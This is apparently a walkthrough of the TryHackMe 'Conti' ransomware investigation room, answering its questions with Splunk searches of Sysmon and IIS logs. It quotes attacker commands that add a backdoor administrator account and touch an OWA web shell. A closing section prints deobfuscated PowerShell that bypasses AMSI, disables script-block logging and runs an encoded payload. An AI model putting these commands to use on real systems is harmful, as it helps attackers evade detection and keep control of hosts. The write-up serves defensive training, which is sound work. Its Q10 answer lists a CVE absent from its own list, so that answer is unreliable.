# TryHackMe: Conti Challenge 
Room URL: https://tryhackme.com/room/contiransomwarehgh

### Intro

An Exchange server was compromised with ransomware. Use Splunk to investigate how the attackers compromised the server.

Some employees from your company reported that they can’t log into Outlook. The Exchange system admin also reported that he can’t log in to the Exchange Admin Center. After initial triage, they discovered some weird readme files settled on the Exchange server.

Below is a copy of the ransomware note.
<img width="1526" height="503" alt="image" src="https://github.com/user-attachments/assets/93d9ff45-e537-458c-b5af-a3ae648741cb" />



### Q1. Can you identify the location of the ransomware?

The common location is Documents or Downloads folders

<img width="1881" height="900" alt="Screenshot 2025-08-03 105036" src="https://github.com/user-attachments/assets/796af4b8-4ae2-4ab2-8097-560c532cbd40" />

- EventCode → `11`  File Creation
- ProcessId: `15540`
- Image: `c:\Users\Administrator\Documents\cmd.exe`
- Time: `09/08/2021 04:08:34 PM`

Ans: `c:\Users\Administrator\Documents\cmd.exe`

### Q2. What is the Sysmon event ID for the related file creation event?

Ans: `11`

### Q3.Can you find the MD5 hash of the ransomware?

Searched for `*cmd.exe*  15540`

<img width="1913" height="886" alt="Screenshot 2025-08-03 110224" src="https://github.com/user-attachments/assets/b7e6c12a-2996-401a-a554-14b0113e9f9f" />

Ans: `290C7DFB01E50CEA9E19DA81A781AF2C`

### Q4. What file was saved to multiple folder locations?

searched for process id `15540`

<img width="1880" height="807" alt="Screenshot 2025-08-03 110400" src="https://github.com/user-attachments/assets/e3517001-f3f9-4fcb-b115-47bbaa04f5bf" />

Ans: `readme.txt`

### Q5. What was the command the attacker used to add a new user to the compromised system?

[Windows Security Log](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/). Searched for the eventcode=1422, eventcode=1420, and found securityninja account was added at the same time the file creation of the cmd.exe happened. So I searchded for that user

<img width="1894" height="896" alt="Screenshot 2025-08-03 111806" src="https://github.com/user-attachments/assets/ceb66a67-ebe6-41ff-9920-590beaa63693" />

- ParentCommandLine: `net  user /add securityninja hardToHack123$`

The attacker added securityninja username with hardToHack123$ password

- CommandLine: `net  localgroup administrators securityninja  /add`

and he also added that use to the `administrators`  group

Ans: `net user /add securityninja hardToHack123$`

### Q6. The attacker migrated the process for better persistence. What is the migrated process image (executable), and what is the original process image (executable) when the attacker got on the system?

In the hint, try sysmod event code 8 → Create Remote Thread

<img width="1517" height="874" alt="Screenshot 2025-08-03 112926" src="https://github.com/user-attachments/assets/81432546-05b4-4a40-aa40-a2f3c3a7d39a" />

- Time: `09/08/2021 03:54:12 PM`
- SourceImage: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
- TargetImage: `C:\Windows\System32\wbem\unsecapp.exe`

The CreateRemoteThread event detects when a process creates a thread in another process. This technique is used by malware to inject code and hide in other processes. The event indicates the source and target process.

Ans: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\wbem\unsecapp.exe`

### Q7. The attacker also retrieved the system hashes. What is the process image used for getting the system hashes?

searched for

```html
index=* "eventcode=8" *unsecapp.exe*
```

Or you will find it with the previous question

<img width="1199" height="433" alt="Screenshot 2025-08-03 114638" src="https://github.com/user-attachments/assets/92ac2044-3292-4974-9a38-8b40fd3b8d95" />

- SourceImage: `C:\Windows\System32\wbem\unsecapp.exe`
- TargetImage: `C:\Windows\System32\lsass.exe` → This is the process used for the system hashes
- Time: `09/08/2021 03:55:30 PM`

Ans: `C:\Windows\System32\lsass.exe` 

### Q8 What is the web shell the exploit deployed to the system?

In the hint, use sourcetype=iis and look for POST requests. So, searched first for DNS query → eventcode=22, then used the sourceip, and looked for destination ip and found this ip → 10.10.10.2 has fewer events, then looked for cs_uri_stem and found two POST requests, one of them was `"/owa/auth/i3gfPctK1c2x.aspx"`

```html
index=*  sourcetype="iis" cs_method=POST s_ip="10.10.10.6" sc_status=200 c_ip="10.10.10.2" cs_uri_stem="/owa/auth/i3gfPctK1c2x.aspx"
```

<img width="1856" height="827" alt="Screenshot 2025-08-03 121147" src="https://github.com/user-attachments/assets/01388420-464b-4f99-b811-5ce1b3f0568c" />

- Time: `2021-09-08 07:51:50 PM`
- Source: `10.10.10.6`
- POST request: `POST /owa/auth/i3gfPctK1c2x.aspx`

### Q9.What is the command line that executed this web shell?

Searched for the malicious web

```powershell
index=* i3gfPctK1c2x.aspx
```

<img width="1918" height="944" alt="Screenshot 2025-08-03 130224" src="https://github.com/user-attachments/assets/c5fa113e-3a7f-4ba1-a638-26943fec6950" />

Time: `09/08/2021 03:52:09 PM`

CommandLine: 

```bash
attrib.exe  -r \\\\win-aoqkg2as2q7.bellybear.local\C$\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\i3gfPctK1c2x.aspx
```

- **`attrib.exe -r`** → Removes the "read-only" attribute from a file so it can be modified or overwritten.
- **`\\win-aoqkg2as2q7.bellybear.local\C$`** → An **administrative share** on Windows, accessible only to accounts with administrative privileges.
- **Path** → Points to the **Outlook Web Access (OWA) auth folder** on a Microsoft Exchange Server.
- **`.aspx` file** → This is likely a **web shell** (backdoor) planted on the Exchange server so the attacker can issue remote commands via HTTP/S.

### Q10. What three CVEs did this exploit leverage? Provide the answer in ascending order.

[**Conti known exploited vulnerabilities:**](https://www.rapid7.com/blog/post/2022/03/01/conti-ransomware-group-internal-chats-leaked-over-russia-ukraine-conflict/)

- [CVE-2017-0143](https://nvd.nist.gov/vuln/detail/CVE-2017-0143), [CVE-2017-0144](https://nvd.nist.gov/vuln/detail/CVE-2017-0144), [CVE-2017-0145](https://nvd.nist.gov/vuln/detail/CVE-2017-0145), [CVE-2017-0146](https://nvd.nist.gov/vuln/detail/CVE-2017-0146) (MS17-010; EternalBlue/EternalSynergy/EternalChampion): allows remote attackers to execute arbitrary code via crafted packets, aka "Windows SMB Remote Code Execution Vulnerability.
- [CVE-2020-1472 (ZeroLogon)](https://nvd.nist.gov/vuln/detail/CVE-2020-1472): An elevation of privilege vulnerability exists when an attacker establishes a vulnerable Netlogon secure channel connection to a domain controller, using the Netlogon Remote Protocol (MS-NRPC)
- [CVE-2021-34527 (PrintNightmare)](https://nvd.nist.gov/vuln/detail/CVE-2021-34527): A remote code execution vulnerability exists when the Windows Print Spooler service improperly performs privileged file operations. An attacker who successfully exploited this vulnerability could run arbitrary code with SYSTEM privileges.
- [CVE-2021-44228 (Log4Shell)](https://nvd.nist.gov/vuln/detail/CVE-2021-44228): Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled
- [CVE-2021-34473](https://nvd.nist.gov/vuln/detail/CVE-2021-34473): Microsoft Exchange Server Remote Code Execution Vulnerability
- [CVE-2021-34523](https://nvd.nist.gov/vuln/detail/CVE-2021-34523):  Microsoft Exchange Server Elevation of Privilege Vulnerability
- [CVE-2021-31207](https://nvd.nist.gov/vuln/detail/CVE-2021-31207): Microsoft Exchange Server Security Feature Bypass Vulnerability
- Firewall exploits ([CVE-2018-13379](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13379) and [CVE-2018-13374](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13374))
- Extra source → [Vulnerabilities used by Conti and its affiliates](https://www.tenable.com/blog/contileaks-chats-reveal-over-30-vulnerabilities-used-by-conti-ransomware-affiliates)

Ans: `CVE-2018-13374,CVE-2018-13379,CVE-2020-0796`

### Optional

used this filter

```html
index=* powershell.exe AND NOT 	*splunkd.exe*
```

<img width="1883" height="963" alt="Screenshot 2025-08-03 123309" src="https://github.com/user-attachments/assets/b788eece-226c-4bf9-94e8-840117aee9b3" />

Time: `09/08/2021 03:52:09 PM`

Analyzed the payload with AI, and this is the result:

**Deobfuscated Components**

**1. Disabling Script Block Logging**

The script first creates a dictionary and constructs strings to manipulate PowerShell logging settings:

```powershell
$tx = "EnableScriptBlockLogging"
$hVd = "ScriptBlockLogging"
$ck = "EnableScriptBlockInvocationLogging"

# For PowerShell v3+
$aPTe = [Ref].Assembly.GetType("System.Management.Automation.Utils")
$xAz = [Ref].Assembly.GetType("System.Management.Automation.AmdlUtils")

# Disables AMSI (Anti-Malware Scan Interface)
$aPTe.GetField("amsiInitFailed", 'NonPublic,Static').SetValue($null, $true)

# Modifies group policy settings to disable logging
$h5uos = $xAz.GetField('cachedGroupPolicySettings','NonPublic,Static')
if ($h5uos) {
    $jX55K = $h5uos.GetValue($null)
    $jX55K[$hVd][$tx] = 0
    $jX55K[$hVd][$ck] = 0
    $fL.Add($tx,0)
    $fL.Add($ck,0)
    $jX55K['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$hVd] = $fL
} else {
    # Alternative method if above fails
    [Ref].Assembly.GetType("System.Management.Automation.ScriptBlock").GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
}
```

**2. Payload Execution**

The script then executes a compressed and base64-encoded payload:

```powershell
&([scriptblock]::create((New-Object System.IO.StreamReader(
    New-Object System.IO.Compression.GzipStream(
        (New-Object System.IO.MemoryStream(,
            [System.Convert]::FromBase64String($longBase64String)
        )),
        [System.IO.Compression.CompressionMode]::Decompress
    ))
).ReadToEnd()))
```

**Security Implications**

1. **AMSI Bypass**: The script attempts to disable AMSI (Anti-Malware Scan Interface), which is a security feature in Windows that scans PowerShell scripts for malicious content.
2. **Logging Disabled**: It modifies PowerShell's logging settings to prevent detection of script execution.
3. **Obfuscated Payload**: The actual payload is compressed and base64-encoded, making it difficult to analyze without execution.
4. **Hidden Execution**: The **`w hidden`** parameter makes the window invisible to the user.

**Recommendations**

1. **Do not execute** this script unless you fully understand its purpose and trust its source.
2. If encountered in the wild, this should be treated as **malicious** due to:
    - AMSI bypass attempt
    - Logging suppression
    - Heavy obfuscation
    - Hidden execution
3. For further analysis, the base64-encoded payload could be extracted and decompressed in a controlled environment to reveal the actual commands being executed.

The script appears to be designed to evade detection while executing potentially malicious commands on the target system.
